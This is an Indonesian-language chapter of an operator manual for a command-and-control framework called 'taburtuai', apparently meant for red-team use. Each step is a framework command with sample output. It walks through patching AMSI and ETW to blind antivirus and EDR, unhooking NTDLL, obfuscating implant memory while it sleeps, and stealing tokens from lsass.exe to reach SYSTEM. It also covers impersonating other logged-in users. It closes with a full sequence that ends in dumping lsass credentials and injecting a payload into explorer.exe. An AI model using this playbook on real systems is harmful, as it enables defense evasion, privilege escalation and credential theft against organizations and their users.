# 11 — Evasion & Defense Bypass

> Teknik-teknik yang digunakan untuk menghindari deteksi setelah agent pertama kali connect.
> Semua bypass harus dilakukan **sebelum** operasi sensitif (injection, credential dumping, dll).

---

## Urutan Evasion yang Direkomendasikan

```
Agent connect pertama kali
         │
         ▼
[Step 1] Verifikasi environment
   ├─ opsec antidebug → pastikan tidak di-debug
   └─ opsec antivm    → pastikan tidak di sandbox/VM
         │
         ▼
[Step 2] Matikan detection mechanisms
   ├─ bypass amsi    → patch AMSI (script scan)
   └─ bypass etw     → patch ETW (event telemetry)
         │
         ▼
[Step 3] Hapus EDR hooks dari NTDLL
   └─ evasion unhook → restore clean ntdll.dll
         │
         ▼
[Step 4] Memory obfuscation saat idle
   └─ evasion sleep  → XOR encrypt memori saat sleep
         │
         ▼
[Step 5] (opsional) Privilege escalation
   └─ token steal    → impersonate SYSTEM / user lain
         │
         ▼
SIAP UNTUK OPERASI (injection, creds, recon, lateral movement)
```

---

## AMSI Bypass

**AMSI (Antimalware Scan Interface)** adalah framework Windows yang memungkinkan
security product scan konten sebelum dieksekusi — termasuk script PowerShell, VBA,
JScript, dan .NET assembly.

### Cara Kerja AMSI

```
Tanpa bypass:
  powershell.exe → [AMSI scan] → Invoke-Mimikatz → AV BLOCK

Dengan bypass:
  powershell.exe → [AMSI patched → skip] → Invoke-Mimikatz → ALLOWED
```

Taburtuai overwrite byte pertama fungsi `AmsiScanBuffer` di `amsi.dll` dengan
`ret 0` — fungsi selalu return "clean", scan tidak pernah terjadi.

### Patch AMSI di Agent Process

```
taburtuai(c2.yourdomain.com:443) › bypass amsi 2703886d --wait
```

**Output:**
```
[*] Locating AmsiScanBuffer in amsi.dll...
[*] amsi.dll base: 0x00007FFD2A340000
[*] AmsiScanBuffer offset: +0x1540
[*] Target address: 0x00007FFD2A341540

[*] Patching (xB8x57x00x07x80xC3 → ret 0)...
[+] AMSI patched successfully.

    Status : DISABLED in agent process (PID 4512)
    Effect : PowerShell scripts, .NET assemblies, VBA macros will NOT be scanned.
    OPSEC  : Patch hanya aktif dalam proses ini — proses baru masih protected.
```

### Patch AMSI di Proses Lain

Berguna untuk menjalankan PowerShell berbahaya dari proses tertentu:

```
# Lihat proses PowerShell yang berjalan
taburtuai(c2.yourdomain.com:443) › process list 2703886d --wait
# PID 5824 powershell.exe CORP\john.doe Medium

# Patch AMSI di PowerShell tersebut
taburtuai(c2.yourdomain.com:443) › bypass amsi 2703886d --pid 5824 --wait
```

**Output:**
```
[*] Patching AmsiScanBuffer in remote PID 5824 (powershell.exe)...
[+] AMSI disabled in PID 5824.
[i] PowerShell di PID 5824 tidak akan scan script apapun.
```

---

## ETW Bypass

**ETW (Event Tracing for Windows)** adalah sistem telemetri Windows yang dipakai EDR
dan SIEM untuk logging aktivitas secara real-time.

### Apa yang Di-log ETW

Tanpa bypass, setiap operasi ini terkirim ke EDR:
- Process creation events (Sysmon EID 1)
- PowerShell ScriptBlock logging (EID 4104)
- Memory allocation di proses lain
- Network connection events
- DNS query events

### Patch ETW

```
taburtuai(c2.yourdomain.com:443) › bypass etw 2703886d --wait
```

**Output:**
```
[*] Locating EtwEventWrite in ntdll.dll...
[*] ntdll.dll base: 0x00007FFD3A2B0000
[*] EtwEventWrite offset: +0x8F420
[*] Target address: 0x00007FFD3A33F420

[*] Patching (ret 0)...
[+] ETW patched successfully.

    Status : DISABLED in agent process (PID 4512)
    Effect : No events will be sent to ETW consumers (EDR, SIEM, Defender).
    
    Dibungkam:
    ✓ PowerShell ScriptBlock logging
    ✓ Process creation ETW events
    ✓ Memory operation events
    ✓ CrowdStrike / SentinelOne ETW subscription
    ✓ Windows Defender ETW telemetry
```

---

## NTDLL Unhooking

EDR modern memasang **hooks** (API detour/trampoline) di fungsi-fungsi kritis di
`ntdll.dll` untuk memantau dan memblokir syscall yang berbahaya.

### Fungsi yang Di-hook EDR (Contoh)

```
ntdll.dll (di memori setelah EDR inject)
├─ NtAllocateVirtualMemory  → [JMP → EDR callback] → syscall asli
├─ NtCreateThreadEx         → [JMP → EDR callback] → syscall asli
├─ NtWriteVirtualMemory     → [JMP → EDR callback] → syscall asli
├─ NtOpenProcess            → [JMP → EDR callback] → syscall asli
└─ NtReadVirtualMemory      → [JMP → EDR callback] → syscall asli
```

Setelah unhook, fungsi-fungsi di atas langsung ke syscall tanpa melewati EDR.

### Unhook dengan Baca Ulang dari Disk

```
taburtuai(c2.yourdomain.com:443) › evasion unhook 2703886d --wait
```

**Output:**
```
[*] NTDLL Unhooking...
[*] Loading clean ntdll.dll from disk: C:\Windows\System32\ntdll.dll
[*] Parsing PE header...
[*] .text section: offset 0x1000, size: 602,112 bytes
[*] Comparing in-memory .text vs disk .text...
    Found 47 modified bytes (hook patches from EDR)
[*] Restoring clean .text section to process memory...
[+] 47 hooks removed. NTDLL is clean.

    Patched functions restored:
    ✓ NtAllocateVirtualMemory
    ✓ NtCreateThreadEx
    ✓ NtWriteVirtualMemory
    ✓ NtOpenProcess
    ✓ NtReadVirtualMemory
    ✓ NtProtectVirtualMemory
    ✓ NtQueryInformationProcess
    ... (40 lainnya)
```

**Cara Kerja:**
1. Baca `ntdll.dll` langsung dari disk (EDR tidak bisa hook file di disk)
2. Parse PE header untuk temukan `.text` section
3. Copy `.text` dari file disk ke `.text` yang ada di memori
4. Semua hook yang EDR pasang di memori hilang — ntdll kembali clean

**Lakukan SEBELUM** injection atau operasi sensitif apa pun.

---

## Sleep Obfuscation

Saat agent idle (sleep antar beacon), isi memorinya masih ada di RAM dan bisa
di-scan oleh memory scanner EDR yang mencari signature shellcode/implant.

Sleep obfuscation mengenkripsi memori agent dengan XOR saat sleep, kemudian
decrypt kembali sebelum melanjutkan eksekusi.

```
taburtuai(c2.yourdomain.com:443) › evasion sleep 2703886d --duration 60 --wait
```

**Output:**
```
[*] Initiating obfuscated sleep for 60 seconds...
[*] XOR-encrypting agent memory regions...
    Region 1: 0x000001F823C40000 - 0x000001F823C60000 (128 KB) — encrypted
    Region 2: 0x000001F823C60000 - 0x000001F823C80000 (128 KB) — encrypted
[*] Sleeping 60 seconds...
    (EDR memory scanner akan melihat encrypted/garbage data, bukan shellcode)
[*] Waking up...
[*] Decrypting agent memory regions...
[+] Sleep obfuscation complete. Agent resumed.
```

**Kapan berguna:**
- EDR yang lakukan periodic memory scan (setiap N detik)
- Memory forensics yang cari signature shellcode di RAM
- YARA rules yang scan proses memory untuk IoC

**Catatan:** Sleep duration ini adalah satu kali tidur yang diobfuscate,
bukan mengubah beacon interval. Beacon interval dikonfigurasi saat build.

---

## Hardware Breakpoints (HWBP)

Hardware breakpoints menggunakan debug registers CPU (DR0–DR3) untuk mendeteksi
akses atau eksekusi ke alamat memori tertentu — tanpa overhead software breakpoints.

### Set Hardware Breakpoint

```
taburtuai(c2.yourdomain.com:443) › evasion hwbp set 2703886d \
  --addr 0x00007FFD3A2B1234 \
  --register 0 \
  --wait
```

**Output:**
```
[*] Setting hardware breakpoint...
    Address  : 0x00007FFD3A2B1234
    Register : DR0
    Type     : Execute (break when RIP reaches this address)
[+] Hardware breakpoint set in DR0.
```

### Hapus Hardware Breakpoint

```
taburtuai(c2.yourdomain.com:443) › evasion hwbp clear 2703886d \
  --register 0 \
  --wait
```

**Output:**
```
[+] Hardware breakpoint cleared from DR0.
```

### Register CPU yang Tersedia

| Register | Kapasitas | Tipe |
|---|---|---|
| DR0 | 1 breakpoint | Execute / Read / Write |
| DR1 | 1 breakpoint | Execute / Read / Write |
| DR2 | 1 breakpoint | Execute / Read / Write |
| DR3 | 1 breakpoint | Execute / Read / Write |

**Kegunaan HWBP dalam offensive context:**
- Intercept hook function sebelum EDR callback
- Deteksi apakah fungsi tertentu di-monitor
- HWBP-based syscall execution (bypass usermode hooks)

---

## Token Manipulation

Windows security model berdasarkan **access token** — objek yang berisi identity,
privileges, dan integrity level proses/thread. Token steal memungkinkan impersonasi
user lain tanpa mengetahui password.

### List Token yang Tersedia

```
taburtuai(c2.yourdomain.com:443) › token list 2703886d --wait
```

**Output:**
```
[+] Token enumeration on DESKTOP-QLPBF95:

PID    PPID   NAME                     USER                       INTEGRITY  PRIVILEGES
─────────────────────────────────────────────────────────────────────────────────────────────
724    4      lsass.exe                NT AUTHORITY\SYSTEM        System     SeDebugPrivilege
                                                                              SeTcbPrivilege
                                                                              SeCreateTokenPrivilege
                                                                              ... (24 total)
1284   724    MsMpEng.exe              NT AUTHORITY\SYSTEM        System     (13 privileges)
3048   1220   explorer.exe             CORP\john.doe              Medium     SeChangeNotifyPrivilege
                                                                              SeIncreaseWorkingSetPrivilege
4512   3048   agent.exe                CORP\john.doe              Medium     SeChangeNotifyPrivilege
5824   3048   powershell.exe           CORP\john.doe              Medium     SeChangeNotifyPrivilege
7832   724    svchost.exe              NT AUTHORITY\SYSTEM        System     (18 privileges)
8008   3048   OneDrive.exe             CORP\john.doe              Medium     SeChangeNotifyPrivilege

[i] Untuk steal token SYSTEM: target PID 724 (lsass.exe) — butuh SeDebugPrivilege.
[i] Current agent token: Medium integrity, CORP\john.doe
```

### Steal Token (Impersonate)

Ambil token dari proses yang berjalan dan impersonate sebagai user tersebut.

```
# Steal token dari lsass.exe → impersonate NT AUTHORITY\SYSTEM
taburtuai(c2.yourdomain.com:443) › token steal 2703886d \
  --pid 724 \
  --wait
```

**Output:**
```
[*] Token steal from PID 724 (lsass.exe)...
[*] OpenProcess(PROCESS_QUERY_INFORMATION, PID=724)...
[*] OpenProcessToken(TOKEN_DUPLICATE)...
[*] DuplicateTokenEx(SecurityImpersonation)...
[*] ImpersonateLoggedOnUser...
[+] Token stolen and impersonated.

    Before : CORP\john.doe (Medium integrity)
    After  : NT AUTHORITY\SYSTEM (System integrity)

[*] Verify dengan: cmd 2703886d "whoami" --wait
```

```
taburtuai(c2.yourdomain.com:443) › cmd 2703886d "whoami" --wait
```

```
[+] Result:
nt authority\system
```

### Steal Token dari User Lain (Lateral Movement)

Jika ada session user lain yang login di mesin yang sama:

```
# Lihat semua session
cmd 2703886d "query session" --wait
```

```
[+] Result:
 SESSIONNAME       USERNAME               ID  STATE   TYPE        DEVICE
 console           admin.corp             1   Active
 rdp-tcp#1         alice.admin            2   Active
```

```
# Cari proses yang dimiliki alice.admin
process list 2703886d --wait
# PID 9240 explorer.exe CORP\alice.admin Medium

# Steal token alice
token steal 2703886d --pid 9240 --wait
```

```
[+] Token stolen.
    After: CORP\alice.admin (Medium integrity)

[i] Sekarang operasi berjalan sebagai alice.admin.
```

### Buat Token (LogonUser — Credential Known)

Jika kamu sudah punya password user:

```
taburtuai(c2.yourdomain.com:443) › token make 2703886d \
  --user john.doe \
  --domain CORP \
  --pass "CorpMail@2026!" \
  --wait
```

**Output:**
```
[*] Creating token via LogonUser...
    Domain : CORP
    User   : john.doe
[*] LogonUser (LOGON32_LOGON_NETWORK)...
[+] Token created and impersonated.
    Identity: CORP\john.doe

[i] Verify dengan: cmd 2703886d "whoami /all" --wait
```

**Kapan berguna:**
- Kamu dapat password dari credential dump tapi tidak ada proses yang dimiliki user itu
- Lateral movement ke share atau remote host dengan credential

### RunAs (Spawn Proses sebagai User Lain)

```
taburtuai(c2.yourdomain.com:443) › token runas 2703886d \
  --user administrator \
  --domain . \
  --pass "Admin123!" \
  --cmd "cmd.exe" \
  --wait
```

**Output:**
```
[*] RunAs: spawning cmd.exe as .\administrator
[*] CreateProcessWithLogonW...
[+] Process spawned: cmd.exe (PID 10240) running as .\administrator
```

### Revert ke Token Asal

```
taburtuai(c2.yourdomain.com:443) › token revert 2703886d --wait
```

**Output:**
```
[*] Reverting impersonation token...
[+] Token reverted.

    Before : NT AUTHORITY\SYSTEM
    After  : CORP\john.doe (original agent token)
```

---

## Rangkuman: Evasion Lengkap Sebelum Operasi

```bash
# ─── Pastikan tidak di sandbox ─────────────────────────────────────────
opsec antidebug 2703886d --wait
# [+] CLEAR — tidak terdeteksi debugger aktif.

opsec antivm 2703886d --wait
# [+] CLEAR — tidak terdeteksi virtual machine.

# ─── Matikan detection mechanisms ─────────────────────────────────────
bypass amsi 2703886d --wait
# [+] AMSI patched successfully. (PID 4512)

bypass etw 2703886d --wait
# [+] ETW patched successfully. 47 events/s silenced.

# ─── Hapus EDR hooks ───────────────────────────────────────────────────
evasion unhook 2703886d --wait
# [+] 47 hooks removed. NTDLL is clean.

# ─── Sleep masking (opsional, kalau ada memory scanning EDR) ──────────
evasion sleep 2703886d --duration 5 --wait
# [+] Sleep obfuscation test complete.

# ─── Privilege escalation (kalau butuh SYSTEM) ─────────────────────────
token list 2703886d --wait
# Catat PID lsass.exe (biasanya 724)
token steal 2703886d --pid 724 --wait
# [+] Impersonating: NT AUTHORITY\SYSTEM

# ─── Verifikasi ────────────────────────────────────────────────────────
cmd 2703886d "whoami" --wait
# nt authority\system  ✓

# ─── SIAP: mulai operasi sensitif ─────────────────────────────────────
creds lsass 2703886d --output "C:\Windows\Temp\w.dmp" --wait
inject remote 2703886d --pid 3048 --file "C:\Windows\Temp\p.bin" --wait
```

---

## Catatan OPSEC

| Tindakan | Risiko jika Skip |
|----------|-----------------|
| `bypass amsi` sebelum run PowerShell | Script PowerShell akan di-scan dan diblokir |
| `bypass etw` sebelum injection | EDR menerima event injection, kemungkinan alert |
| `evasion unhook` sebelum creds dump | API call NTDLL melewati EDR hook, kemungkinan blocked |
| `token revert` setelah selesai | Token SYSTEM di proses non-SYSTEM menarik perhatian EDR |

---

**Selanjutnya:** [12 — Credential Access](12-credentials.md)
